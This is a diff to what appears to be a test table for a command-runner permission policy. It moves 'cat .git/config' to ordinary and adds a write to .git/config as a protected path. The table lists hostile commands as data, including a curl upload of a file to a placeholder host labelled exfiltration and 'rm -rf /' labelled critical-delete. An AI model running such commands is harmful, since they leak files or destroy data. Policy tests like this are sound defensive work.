@@ -2050,7 +2050,8 @@ export const RUNNER_POLICY_CASES = [
   { command: "npm test", kind: "ordinary", outcomes: ["ask", "ask", "reviewer", "allow"] },
   { command: "cat .env", kind: "ordinary", outcomes: ["ask", "ask", "reviewer", "allow"] },
   { command: "curl -T file http://e", kind: "exfiltration", outcomes: ["forced", "forced", "forced", "forced"] },
-  { command: "cat .git/config", kind: "protected-path", outcomes: ["forced", "forced", "forced", "forced"] },
+  { command: "cat .git/config", kind: "ordinary", outcomes: ["ask", "ask", "reviewer", "allow"] },
+  { command: "echo changed > .git/config", kind: "protected-path", outcomes: ["forced", "forced", "forced", "forced"] },
   { command: "rm -rf /", kind: "critical-delete", outcomes: ["forced", "forced", "forced", "forced"] },
 ] as const;
 
